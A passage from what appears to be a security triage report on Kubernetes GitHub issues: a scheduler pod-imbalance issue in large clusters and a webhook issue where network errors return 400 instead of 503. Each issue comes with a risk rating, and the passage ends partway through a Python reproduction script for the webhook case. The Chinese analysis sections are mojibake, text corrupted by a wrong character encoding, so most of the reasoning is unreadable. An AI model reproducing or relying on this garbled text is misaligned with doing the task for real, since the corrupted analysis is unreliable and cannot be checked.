    *   **è¶…æ—¶æœºåˆ¶**: è„šæœ¬è®¾ç½®äº†ä¸€ä¸ªæ€»çš„è¶…æ—¶æ—¶é—´ `SCRIPT_TIMEOUT` (120ç§’)ï¼Œå¹¶åœ¨æ¸…ç†é˜¶æ®µæ£€æŸ¥å‰©ä½™æ—¶é—´ï¼Œé¿å…æ¸…ç†æ“ä½œè¢«å¼ºåˆ¶ä¸­æ–­ã€‚åŒæ—¶ï¼Œå…³é”®çš„ API è°ƒç”¨ï¼ˆå¦‚åˆ›å»º/åˆ é™¤èµ„æºï¼‰ä¹Ÿè®¾ç½®äº†å„è‡ªçš„ `timeout_seconds` å‚æ•°ã€‚
4.  **å¦‚ä½•è¿è¡Œ**:
    *   ç¡®ä¿å®‰è£…äº† `kubernetes` åº“: `pip install kubernetes`
    *   ç¡®ä¿ `kubectl` é…ç½®æ­£ç¡®ä¸”æœ‰è¶³å¤Ÿæƒé™ã€‚
    *   ç›´æ¥è¿è¡Œ Python è„šæœ¬: `python your_script_name.py`
5.  **é¢„æœŸè¾“å‡º**: å¦‚æœè„šæœ¬æˆåŠŸè¿è¡Œï¼Œå®ƒå°†è¾“å‡ºæ—¥å¿—ä¿¡æ¯ï¼Œæ˜¾ç¤ºåŠ è½½é…ç½®ã€åˆ›å»ºå‘½åç©ºé—´ã€åˆ›å»º ResourceQuota çš„è¿‡ç¨‹ï¼Œå¹¶æœ€ç»ˆæ‰“å°â€œå¤ç°æˆåŠŸâ€çš„æ¶ˆæ¯ã€‚æœ€åä¼šå°è¯•æ¸…ç†åˆ›å»ºçš„èµ„æºã€‚å¦‚æœæƒé™ä¸è¶³æˆ–è¿æ¥ K8s é›†ç¾¤å¤±è´¥ï¼Œä¼šè¾“å‡ºç›¸åº”çš„é”™è¯¯ä¿¡æ¯ã€‚

è¯¥è„šæœ¬è¯æ˜äº† Kubernetes API å…è®¸åˆ›å»º `requests > limits` çš„ `ResourceQuota`ï¼Œä¸ Issue ä¸­æè¿°çš„è¡Œä¸ºä¸€è‡´ã€‚ç”±äºè¿™å¹¶éå®‰å…¨æ¼æ´ï¼Œæ­¤è„šæœ¬ä»…ç”¨äºéªŒè¯å’Œæ¼”ç¤ºè¯¥è¡Œä¸ºã€‚

---


## Issue #130692 Scheduler is not balancing properly the pods across the nodes in big clusters (>200 nodes) in quick massive scale ups

- Issue é“¾æ¥ï¼š[#130692](https://github.com/kubernetes/kubernetes/issues/130692)

### Issue å†…å®¹

#### What happened?

In some scenarios, the k8s scheduler is not balancing the pods properly across the cluster.  In _big_ clusters (> 200 nodes), doing a _quick_ massive scale up of pods that have the same resource requests (and no constraints or affinity), we have detected that the scheduling spread is ~20 pods from most utilized to least utilized nodes. This scale up scenario has been tested with deployments modifying all the min replicas of HPA of hundreds of deployments, all at the same time, scaling up around 7000 pods. If using different resource request, nodes are also not balanced (`sum by (node) (kube_pod_container_resource_requests_cpu_cores)`).

In smaller clusters, or scaling up _slowly_ deployments (few at a time, taking some hours to scale up 7000 pods), we have not detected this issue.

Debugging this issue is not easy, as it requires a big cluster, and setting a debug level 10, with thousands of pods being scheduled in seconds, can generate a huge amount of logs. And having a score list of more than 100 nodes each scheduling cycle, with thousands of scheduling cycles...

#### What did you expect to happen?

- Using pods with the same resource requests, all the nodes should have the same number of pods. The scheduling spread should be a few pods from most utilized to least utilized nodes 
- Using different cpu requests, CPU requests should be balanced across all the nodes

#### How can we reproduce it (as minimally and precisely as possible)?

1. Scale a k8s cluster to have  > 200 nodes. For example, 280 nodes.
2. Create hundreds of deployments (no need to use constraints or affinity to be easier)
3. Scale all the deployments (create ~ 7000 pods), for example, changing the min replicas of HPA
4. Check the pods distribution across the cluster. All the nodes should have the same amount of pods, or at least, the scheduling spread should be a few pods from most utilized to least utilized nodes 

#### Anything else we need to know?

In clusters with more than _minFeasibleNodesToFind_ (100 by default), the scheduler algorithm creates a sublist of nodes each scheduling cycle. 

Considering 250 nodes, and following the [schedule_one code](https://github.com/kubernetes/kubernetes/blob/release-1.27/pkg/scheduler/schedule_one.go):

~~~
260 < 100 is false.
Assuming percentage is zero.

percentage = int32(50) - 260/125  # percentage = 48
48 < 5 is false.

numNodes = 260 * 48 / 100     # numNodes = 124

124 < 100 is false, then 124 is returned.
~~~ 

However, if 7000 pods needs to be scheduled, all the nodes should be evaluated the same amount of time, although in different node lists each time:

1. **Schedule 1:** Node 1 - Node 124
2. **Schedule 2**: Node 125 - Node 248
3. **Schedule 3**: Node 249 - Node 112
4. **Schedule 4**: Node 113 - Node 236
5. ...

The [schedule_one code](https://github.com/kubernetes/kubernetes/blob/release-1.27/pkg/scheduler/schedule_one.go):


```
const (
	// minFeasibleNodesToFind is the minimum number of nodes that would be scored
	// in each scheduling cycle. This is a semi-arbitrary value to ensure that a
	// certain minimum of nodes are checked for feasibility. This in turn helps
	// ensure a minimum level of spreading.
	minFeasibleNodesToFind = 100                                      

	// minFeasibleNodesPercentageToFind is the minimum percentage of nodes that
	// would be scored in each scheduling cycle. This is a semi-arbitrary value
	// to ensure that a certain minimum of nodes are checked for feasibility.
	// This in turn helps ensure a minimum level of spreading.
	minFeasibleNodesPercentageToFind = 5
)

// findNodesThatPassFilters finds the nodes that fit the filter plugins.
func (sched *Scheduler) findNodesThatPassFilters(
...
	numAllNodes := len(nodes)
	numNodesToFind := sched.numFeasibleNodesToFind(fwk.PercentageOfNodesToScore(), int32(numAllNodes))
...
	// We check the nodes starting from where we left off in the previous scheduling cycle,              <== All nodes are considered in a round-robin fashion.
	// this is to make sure all nodes have the same chance of being examined across pods.
	nodeInfo := nodes[(sched.nextStartNodeIndex+i)%numAllNodes]

func (sched *Scheduler) numFeasibleNodesToFind(percentageOfNodesToScore *int32, numAllNodes int32) (numNodes int32) {
	if numAllNodes < minFeasibleNodesToFind {
		return numAllNodes
	}
	
	if percentageOfNodesToScore != nil {
		percentage = *percentageOfNodesToScore
	} else {
		percentage = sched.percentageOfNodesToScore
	}
	
	if percentage == 0 {
		percentage = int32(50) - numAllNodes/125
		if percentage < minFeasibleNodesPercentageToFind {
			percentage = minFeasibleNodesPercentageToFind
		}
	}

	numNodes = numAllNodes * percentage / 100
	if numNodes < minFeasibleNodesToFind {
		return minFeasibleNodesToFind
	}

	return numNodes
}
```


#### Kubernetes version

- 1.27
- 1.30

#### Cloud provider

- Baremetal
- Azure

#### OS version

- Red Hat Enterprise Linux CoreOS 4.14
- Red Hat Enterprise Linux CoreOS 4.17

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

- cri-o 1.27
- cri-o 1.30

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issueæè¿°åˆ†æ**: è¯¥Issueæè¿°äº†åœ¨å¤§å‹Kubernetesé›†ç¾¤ï¼ˆ>200ä¸ªèŠ‚ç‚¹ï¼‰ä¸­è¿›è¡Œå¿«é€Ÿã€å¤§è§„æ¨¡ï¼ˆ~7000ä¸ªPodï¼‰æ‰©å®¹æ—¶ï¼Œè°ƒåº¦å™¨ï¼ˆschedulerï¼‰æœªèƒ½å°†å…·æœ‰ç›¸åŒèµ„æºè¯·æ±‚ï¼ˆä¸”æ— çº¦æŸæˆ–äº²å’Œæ€§ï¼‰çš„Podå‡åŒ€åˆ†å¸ƒåˆ°å„ä¸ªèŠ‚ç‚¹ä¸Šï¼Œå¯¼è‡´èŠ‚ç‚¹é—´è´Ÿè½½å·®å¼‚è¾ƒå¤§ï¼ˆæœ€ç¹å¿™å’Œæœ€ä¸ç¹å¿™èŠ‚ç‚¹é—´Podæ•°é‡å·®å¼‚çº¦20ä¸ªï¼‰ã€‚å³ä½¿Podå…·æœ‰ä¸åŒçš„CPUè¯·æ±‚ï¼ŒCPUè¯·æ±‚çš„æ€»å’Œåœ¨èŠ‚ç‚¹é—´ä¹Ÿæœªè¾¾åˆ°å¹³è¡¡ã€‚è¯¥é—®é¢˜åœ¨å°å‹é›†ç¾¤æˆ–ç¼“æ…¢æ‰©å®¹æ—¶æœªè¢«è§‚å¯Ÿåˆ°ã€‚Issueæäº¤è€…åˆ†æäº†è°ƒåº¦å™¨çš„`schedule_one`ä»£ç é€»è¾‘ï¼Œç‰¹åˆ«æ˜¯ä¸èŠ‚ç‚¹é‡‡æ ·ç›¸å…³çš„éƒ¨åˆ†ï¼ˆ`minFeasibleNodesToFind`å’Œ`percentageOfNodesToScore`ï¼‰ï¼Œè®¤ä¸ºå°½ç®¡æ¯æ¬¡è°ƒåº¦åªè¯„ä¼°ä¸€éƒ¨åˆ†èŠ‚ç‚¹ï¼Œä½†ç†è®ºä¸Šé€šè¿‡è½®è¯¢ï¼ˆround-robinï¼‰åº”è¯¥èƒ½è¦†ç›–æ‰€æœ‰èŠ‚ç‚¹ï¼Œè¾¾åˆ°æœ€ç»ˆçš„å¹³è¡¡ã€‚ç„¶è€Œå®é™…è§‚å¯Ÿåˆ°çš„ç»“æœä¸é¢„æœŸä¸ç¬¦ã€‚
2.  **æ½œåœ¨é£é™©åˆ†æ**:
    *   è¯¥Issueçš„æ ¸å¿ƒæ˜¯è°ƒåº¦å™¨çš„**æ€§èƒ½å’Œå…¬å¹³æ€§**é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚å®ƒæè¿°çš„æ˜¯åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼ˆå¤§é›†ç¾¤ã€å¿«é€Ÿã€å¤§è§„æ¨¡æ‰©å®¹ï¼‰è°ƒåº¦ç®—æ³•æœªèƒ½è¾¾åˆ°ç†æƒ³çš„è´Ÿè½½å‡è¡¡æ•ˆæœã€‚
    *   è¿™å¯èƒ½å¯¼è‡´éƒ¨åˆ†èŠ‚ç‚¹èµ„æºè¿‡è½½ï¼Œè€Œå¦ä¸€äº›èŠ‚ç‚¹èµ„æºåˆ©ç”¨ç‡ä½ä¸‹ï¼Œå½±å“é›†ç¾¤æ•´ä½“çš„èµ„æºåˆ©ç”¨æ•ˆç‡å’Œåº”ç”¨çš„æ€§èƒ½ç¨³å®šæ€§ã€‚æç«¯æƒ…å†µä¸‹ï¼Œè¿‡åº¦é›†ä¸­çš„Podå¯èƒ½å¯¼è‡´æŸäº›èŠ‚ç‚¹èµ„æºè€—å°½ï¼Œè¿›è€Œå½±å“å…¶ä¸Šè¿è¡Œçš„Podçš„å¯ç”¨æ€§ï¼Œä½†è¿™å±äºèµ„æºç®¡ç†å’Œå¯ç”¨æ€§é—®é¢˜ã€‚
    *   è¯¥è¡Œä¸º**ä¸æ¶‰åŠ**æœªæˆæƒè®¿é—®ã€æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²ã€è¿œç¨‹ä»£ç æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰å…¸å‹çš„å®‰å…¨é£é™©ã€‚
    *   è™½ç„¶è°ƒåº¦ä¸å‡å¯èƒ½é—´æ¥å¯¼è‡´æŸäº›èŠ‚ç‚¹æ›´å®¹æ˜“å—åˆ°èµ„æºè€—å°½å‹æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰çš„å½±å“ï¼Œä½†è¿™å¹¶éç”±å¤–éƒ¨æ”»å‡»è€…åˆ©ç”¨æ¼æ´å‘èµ·ï¼Œè€Œæ˜¯é›†ç¾¤è‡ªèº«è°ƒåº¦è¡Œä¸ºçš„ç»“æœã€‚è§¦å‘æ­¤ç°è±¡éœ€è¦ç”¨æˆ·å…·æœ‰åˆ›å»º/æ‰©å±•å¤§é‡Deployment/Podçš„æƒé™ï¼Œè¿™é€šå¸¸æ˜¯é›†ç¾¤ç®¡ç†å‘˜æˆ–å…·æœ‰ç›¸åº”æˆæƒçš„ç”¨æˆ·æ‰èƒ½æ‰§è¡Œçš„æ“ä½œã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬5æ¡ï¼Œå³ä½¿è§†ä¸ºæŸç§ç¨‹åº¦çš„DoSï¼Œç”±äºéœ€è¦è¾ƒé«˜æƒé™æ‰èƒ½è§¦å‘ï¼Œä¸”å¹¶éå…¸å‹çš„æ”»å‡»å‘é‡ï¼Œå…¶é£é™©ç­‰çº§ä¹Ÿåº”è¾ƒä½æˆ–ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚
    *   Issueæäº¤è€…åœ¨æè¿°ä¸­å¹¶æœªæš´éœ²ä»»ä½•æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å‡­è¯ã€ç§æœ‰IPã€å†…éƒ¨åŸŸåç­‰ï¼‰ï¼Œä¹Ÿæœªæè¿°ä¸å½“çš„æ“ä½œæˆ–é…ç½®å¯¼è‡´çš„é—®é¢˜ã€‚ä»–æè¿°çš„æ˜¯Kubernetesè°ƒåº¦å™¨åœ¨ç‰¹å®šåœºæ™¯ä¸‹çš„è¡Œä¸ºè¡¨ç°ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œè¿™ä¸å±äºå®‰å…¨é£é™©ã€‚
    *   è¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜å±é£é™©ï¼ˆæ ‡å‡†7ï¼‰ã€‚
    *   è™½ç„¶å‘ç”Ÿåœ¨å¤šç”¨æˆ·åœºæ™¯ï¼Œä½†è°ƒåº¦ä¸å‡æ˜¯ç³»ç»Ÿå±‚é¢çš„èµ„æºåˆ†é…é—®é¢˜ï¼Œå½±å“æ‰€æœ‰éœ€è¦è°ƒåº¦çš„Podï¼Œå¹¶éä½æƒé™ç”¨æˆ·åˆ©ç”¨æ­¤é—®é¢˜å½±å“å…¶ä»–ç”¨æˆ·ï¼ˆæ ‡å‡†8ï¼‰ã€‚
3.  **ç»“è®º**: è¯¥Issueæè¿°çš„æ˜¯Kubernetesè°ƒåº¦å™¨åœ¨ç‰¹å®šåœºæ™¯ä¸‹çš„æ€§èƒ½å’Œè´Ÿè½½å‡è¡¡é—®é¢˜ï¼Œå±äºåŠŸèƒ½æˆ–æ€§èƒ½ç¼ºé™·ï¼Œä¸æ„æˆå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥Issueæè¿°çš„æ˜¯è°ƒåº¦å™¨åœ¨ç‰¹å®šå¤§è§„æ¨¡åœºæ™¯ä¸‹çš„è¡Œä¸ºé—®é¢˜ï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ï¼Œ
# ä¸”å¤ç°éœ€è¦å¤§å‹é›†ç¾¤ï¼ˆ>200èŠ‚ç‚¹ï¼‰å’Œå¤§é‡Podï¼ˆ~7000ï¼‰ï¼Œ
# ç¼–å†™ä¸€ä¸ªèƒ½åœ¨æœ¬åœ°ç®€å•ç¯å¢ƒå¤ç°æ­¤è§„æ¨¡å’Œæ¡ä»¶çš„POCä¸åˆ‡å®é™…ä¸”æ— åŠ©äºå®‰å…¨é£é™©éªŒè¯ã€‚
# å› æ­¤ï¼Œæ ¹æ®é£é™©è¯„çº§å’Œé—®é¢˜æ€§è´¨ï¼Œä¸æä¾›å¤ç°è„šæœ¬ã€‚
print("è¯¥Issueæè¿°çš„æ˜¯Kubernetesè°ƒåº¦å™¨åœ¨ç‰¹å®šå¤§è§„æ¨¡åœºæ™¯ä¸‹çš„æ€§èƒ½å’Œè´Ÿè½½å‡è¡¡é—®é¢˜ï¼Œ")
print("å±äºåŠŸèƒ½æˆ–æ€§èƒ½ç¼ºé™·ï¼Œä¸æ„æˆå®‰å…¨é£é™©ã€‚")
print("å¤ç°è¯¥é—®é¢˜éœ€è¦å¤§è§„æ¨¡é›†ç¾¤ç¯å¢ƒï¼Œæ— æ³•é€šè¿‡ç®€å•çš„æœ¬åœ°è„šæœ¬æ¨¡æ‹Ÿã€‚")
print("å› æ­¤ï¼Œä¸æä¾›å¤ç°è„šæœ¬ã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥IssueæŠ¥å‘Šäº†ä¸€ä¸ªåœ¨å¤§å‹Kubernetesé›†ç¾¤ï¼ˆè¶…è¿‡200ä¸ªèŠ‚ç‚¹ï¼‰ä¸­å¿«é€Ÿã€å¤§è§„æ¨¡åœ°ï¼ˆä¾‹å¦‚ï¼ŒåŒæ—¶æ‰©å®¹æ•°åƒä¸ªPodï¼‰è°ƒåº¦å…·æœ‰ç›¸åŒèµ„æºè¯·æ±‚çš„Podæ—¶ï¼Œå‡ºç°çš„Podåˆ†å¸ƒä¸å‡çš„é—®é¢˜ã€‚è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè°ƒåº¦ç®—æ³•åœ¨ç‰¹å®šæç«¯æ¡ä»¶ä¸‹çš„æ€§èƒ½è¡¨ç°å’Œè´Ÿè½½å‡è¡¡æ•ˆæœæœªè¾¾é¢„æœŸçš„é—®é¢˜ï¼Œå¯èƒ½å½±å“é›†ç¾¤çš„èµ„æºåˆ©ç”¨ç‡å’Œåº”ç”¨çš„éƒ¨ç½²å‡åŒ€æ€§ã€‚

æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥é—®é¢˜å¹¶éå®‰å…¨æ¼æ´ï¼Œä¸æ¶‰åŠæœªæˆæƒè®¿é—®ã€æ•°æ®æ³„éœ²ã€ä»£ç æ‰§è¡Œç­‰å®‰å…¨å¨èƒï¼Œå› æ­¤é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼ˆæ ‡å‡†2ï¼‰ã€‚
2.  è§¦å‘æ­¤ç°è±¡éœ€è¦è¿›è¡Œå¤§è§„æ¨¡æ‰©å®¹æ“ä½œï¼Œè¿™æœ¬èº«å°±éœ€è¦ç›¸åº”çš„Kubernetesæƒé™ï¼Œå¹¶éæ— æƒé™æˆ–ä½æƒé™ç”¨æˆ·å¯ä»¥éšæ„è§¦å‘ï¼ˆæ ‡å‡†5ï¼‰ã€‚
3.  é—®é¢˜æœ¬èº«ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜å±é£é™©ï¼ˆæ ‡å‡†7ï¼‰ã€‚
4.  è™½ç„¶å½±å“é›†ç¾¤èµ„æºåˆ†é…ï¼Œä½†ä¸å±äºä¸€ä¸ªç”¨æˆ·åˆ©ç”¨æ¼æ´å½±å“å…¶ä»–ç”¨æˆ·å®‰å…¨çš„æƒ…å†µï¼ˆæ ‡å‡†8ï¼‰ã€‚

ç”±äºè¯¥Issueè¢«è¯„ä¼°ä¸ºâ€œä¸æ¶‰åŠâ€å®‰å…¨é£é™©ï¼Œä¸”å¤ç°æ¡ä»¶è‹›åˆ»ï¼ˆéœ€è¦å¤§å‹é›†ç¾¤å’Œæ¨¡æ‹Ÿå¤§è§„æ¨¡å¿«é€Ÿæ‰©å®¹ï¼‰ï¼Œç¼–å†™ç”¨äºå®‰å…¨éªŒè¯çš„POCæ—¢ä¸å¿…è¦ä¹Ÿä¸å¯è¡Œã€‚å› æ­¤ï¼Œæœªæä¾›å¤ç°è„šæœ¬ï¼Œä»…åœ¨è„šæœ¬ä¸­è¾“å‡ºäº†ç›¸åº”çš„è§£é‡Šä¿¡æ¯ã€‚

---


## Issue #130690 Apiserver admission control (validating, mutating webhooks) return misleading response code 400 on network errors

- Issue é“¾æ¥ï¼š[#130690](https://github.com/kubernetes/kubernetes/issues/130690)

### Issue å†…å®¹

#### What happened?

When the apiserver calls a webhook, be it validating or mutating, and the configured endpoint is not reachable due to network issue (timeout, EOF due to a broken connection, rejected new connection, ...) the error defaults to a `400 Bad Request`:

* https://github.com/kubernetes/kubernetes/blob/9d2fc46556af162ff42a4773349d0f92f9ef8d50/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/validating/dispatcher.go#L309
* https://github.com/kubernetes/kubernetes/blob/9d2fc46556af162ff42a4773349d0f92f9ef8d50/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/mutating/dispatcher.go#L308

I noticed this when analyzing some random webhook invocation errors and seeing that that the increasing `apiserver_admission_webhook_rejection_count` metric (https://kubernetes.io/docs/reference/instrumentation/metrics/) had `rejection_code="400"`. This metric was introduced by @roycaihw in PR https://github.com/kubernetes/kubernetes/pull/81399 to expose the various causes for rejects.

With 4xx being "user side errors" and 5xx being server side errors, this mapping is clearly misleading or even incorrect and I suspected the actual webhook endpoint had responded with a 400.

But the client is clearly NOT at fault here. The 4xx even would indicate that a retry is likely not successful.




#### What did you expect to happen?

Non HTTP errors from a failed connection to the webhook endpoint should be mapped to `503 Service Unavailable` with either https://github.com/kubernetes/apimachinery/blob/e25aab096bf1a9b677c0e04efd3870b396494782/pkg/api/errors/errors.go#L339 or even https://github.com/kubernetes/apimachinery/blob/e25aab096bf1a9b677c0e04efd3870b396494782/pkg/api/errors/errors.go#L386 clearly indicating that this is an internal error.

Looking at the handling of response parsing errors in https://github.com/kubernetes/kubernetes/blob/9d2fc46556af162ff42a4773349d0f92f9ef8d50/staging/src/k8s.io/apiserver/pkg/admission/plugin/webhook/validating/dispatcher.go#L317-L317 there actually are cased handled with `503`.



#### How can we reproduce it (as minimally and precisely as possible)?

1. Register an invalid webhook URL
2. Invoke e.g. a Pod creation and look at the mentioned metrics.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
1.31
1.32
(also present in main)
</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

NOT RELEVANT

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº† Kubernetes Apiserver åœ¨è°ƒç”¨ admission webhook (validating æˆ– mutating) æ—¶ï¼Œå¦‚æœé‡åˆ°ç½‘ç»œé”™è¯¯ï¼ˆä¾‹å¦‚è¶…æ—¶ã€è¿æ¥æ‹’ç»ã€EOF ç­‰å¯¼è‡´æ— æ³•è®¿é—® webhook endpointï¼‰ï¼ŒApiserver ä¼šå‘å‘èµ·è¯·æ±‚çš„å®¢æˆ·ç«¯è¿”å› HTTP 400 Bad Request é”™è¯¯ç ã€‚

é—®é¢˜æ ¸å¿ƒåœ¨äºé”™è¯¯ç çš„è¯¯å¯¼æ€§ï¼š
1.  ç½‘ç»œé”™è¯¯å¯¼è‡´ Apiserver æ— æ³•è¿æ¥åˆ°å…¶é…ç½®çš„å†…éƒ¨ç»„ä»¶ï¼ˆwebhook serverï¼‰ï¼Œè¿™æœ¬è´¨ä¸Šæ˜¯æœåŠ¡ç«¯ï¼ˆApiserver æˆ–å…¶ä¾èµ–çš„æœåŠ¡ï¼‰çš„é—®é¢˜ï¼ŒæŒ‰ç…§ HTTP è¯­ä¹‰ï¼Œåº”è¯¥è¿”å› 5xx ç³»åˆ—é”™è¯¯ç ï¼ˆå¦‚ 503 Service Unavailableï¼‰ï¼Œè¡¨ç¤ºæœåŠ¡ç«¯æš‚æ—¶æ— æ³•å¤„ç†è¯·æ±‚ã€‚
2.  è¿”å› 400 Bad Request æš—ç¤ºæ˜¯å®¢æˆ·ç«¯ï¼ˆå¦‚ç”¨æˆ·ã€æ§åˆ¶å™¨ç­‰è°ƒç”¨ Apiserver API çš„å®ä½“ï¼‰å‘é€çš„è¯·æ±‚æœ‰é—®é¢˜ï¼Œè¿™ä¸å®é™…æƒ…å†µï¼ˆç½‘ç»œè¿æ¥å¤±è´¥ï¼‰ä¸ç¬¦ã€‚
3.  è¿™ç§é”™è¯¯çš„é”™è¯¯ç ä¼šè¯¯å¯¼ç”¨æˆ·å’Œç›‘æ§ç³»ç»Ÿï¼ˆå¦‚ Issue ä¸­æåˆ°çš„ `apiserver_admission_webhook_rejection_count` æŒ‡æ ‡è®°å½•ä¸º 400ï¼‰ï¼Œå¢åŠ é—®é¢˜æ’æŸ¥çš„éš¾åº¦ï¼Œç”¨æˆ·å¯èƒ½ä¼šé”™è¯¯åœ°è®¤ä¸ºè‡ªå·±çš„è¯·æ±‚æ ¼å¼æˆ–å†…å®¹æœ‰è¯¯ã€‚

å®‰å…¨é£é™©åˆ†æï¼š
1.  **è¯¥é—®é¢˜æ˜¯å¦å¼•å…¥äº†æ–°çš„æ”»å‡»å‘é‡ï¼Ÿ** å¦ã€‚è¯¥é—®é¢˜æ˜¯å…³äº Apiserver å¦‚ä½•æŠ¥å‘Š *å·²ç»å‘ç”Ÿçš„* ç½‘ç»œé”™è¯¯ã€‚å®ƒæœ¬èº«å¹¶ä¸åˆ›é€ æ–°çš„æ¼æ´è®©æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¥è®¿é—®æœªæˆæƒèµ„æºã€æ‰§è¡Œä»£ç æˆ–æå‡æƒé™ã€‚
2.  **æ˜¯å¦å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Ÿ** å¦ã€‚è¿”å›é”™è¯¯çš„ 400 çŠ¶æ€ç ï¼Œè™½ç„¶ä»¤äººå›°æƒ‘ï¼Œä½†å¹¶æœªæ³„éœ²è¶…å‡ºæ­£å¸¸é”™è¯¯ä¿¡æ¯èŒƒå›´ä¹‹å¤–çš„æ•æ„Ÿæ•°æ®ã€‚
3.  **æ˜¯å¦å¯è¢«åˆ©ç”¨äº DoSï¼Ÿ** Admission Webhook æœ¬èº«å¦‚æœé…ç½®äº† `failurePolicy: Fail`ï¼Œå½“å…¶åç«¯ä¸å¯è¾¾æ—¶ï¼Œç¡®å®ä¼šé˜»æ­¢åŒ¹é…è§„åˆ™çš„ API è¯·æ±‚ï¼Œé€ æˆ DoSã€‚ç„¶è€Œï¼Œè¿™æ˜¯ `failurePolicy: Fail` çš„é¢„æœŸè¡Œä¸ºï¼Œæ—¨åœ¨ç¡®ä¿ç­–ç•¥å¼ºåˆ¶æ‰§è¡Œã€‚è¯¥ Issue æè¿°çš„ *é”™è¯¯ç * é—®é¢˜ï¼Œå¹¶ä¸ä¼š *å¯¼è‡´* æˆ– *åŠ å‰§* è¿™ç§ DoSï¼Œåªæ˜¯é”™è¯¯åœ°æŠ¥å‘Šäº† DoS çš„åŸå› ã€‚æ”»å‡»è€…å¦‚æœæƒ³åˆ©ç”¨ webhook è¿›è¡Œ DoSï¼Œéœ€è¦å…·å¤‡åˆ›å»º/ä¿®æ”¹ `ValidatingWebhookConfiguration` æˆ– `MutatingWebhookConfiguration` çš„é«˜æƒé™ï¼Œå¹¶ä¸”æ ¸å¿ƒæ˜¯è®© webhook åç«¯ä¸å¯è¾¾ï¼Œè€Œä¸æ˜¯åˆ©ç”¨è¿”å› 400 è¿™ä¸ªé”™è¯¯ç æœ¬èº«ã€‚æ ¹æ®æ ‡å‡† 5ï¼Œè¿™ç§éœ€è¦é«˜æƒé™æ‰èƒ½é…ç½®è§¦å‘çš„ DoSï¼Œä¸”é—®é¢˜æœ¬èº«æ˜¯é”™è¯¯æŠ¥å‘Šè€Œéæ”»å‡»ä½¿èƒ½ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
4.  **æ˜¯å¦æ¶‰åŠææƒã€å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰é«˜é£é™©åœºæ™¯ï¼Ÿ** å¦ã€‚
5.  **å¤šç§Ÿæˆ·åœºæ™¯å½±å“ï¼Ÿ** ä¸€ä¸ªç”¨æˆ·ï¼ˆé€šå¸¸æ˜¯ç®¡ç†å‘˜ï¼‰é…ç½®çš„ webhook å¦‚æœå¤±æ•ˆï¼Œä¼šå½±å“æ‰€æœ‰è§¦å‘è¯¥ webhook çš„ç”¨æˆ·ã€‚ä½†è¿™éœ€è¦é…ç½®æƒé™ï¼Œä½æƒé™ç”¨æˆ·æ— æ³•é€šè¿‡æ­¤é—®é¢˜å½±å“å…¶ä»–ç”¨æˆ·ã€‚

ç»“è®ºï¼šè¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜æ˜¯ä¸€ä¸ªé”™è¯¯å¤„ç†å’ŒæŠ¥å‘Šçš„ç¼ºé™·ï¼ˆBugï¼‰ï¼Œå½±å“äº†ç³»ç»Ÿçš„å¯è§‚æµ‹æ€§å’Œé—®é¢˜æ’æŸ¥æ•ˆç‡ï¼Œä½†å®ƒæœ¬èº«ä¸æ„æˆä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œæ²¡æœ‰å¼•å…¥æ–°çš„å®‰å…¨é£é™©ã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨è¿™ä¸ªâ€œè¿”å›é”™è¯¯ç ä¸º 400â€çš„è¡Œä¸ºæ¥è·å¾—é¢å¤–çš„æƒé™æˆ–èƒ½åŠ›ã€‚å› æ­¤ï¼Œé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import sys
import uuid
import time
from contextlib import contextmanager
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# Constants
WEBHOOK_NAME = f"poc-misleading-error-{uuid.uuid4().hex[:6]}"
NAMESPACE = "default" # Namespace for pod creation test
POD_NAME = f"poc-pod-{uuid.uuid4().hex[:6]}"
# Use a non-existent service URL to simulate network error
UNREACHABLE_WEBHOOK_URL = "https://webhook-does-not-exist-for-poc.local:443/validate"

@contextmanager
def validating_webhook_configuration(api_instance: client.AdmissionregistrationV1Api):
    """Context manager to create and clean up ValidatingWebhookConfiguration."""
    webhook_config = client.V1ValidatingWebhookConfiguration(
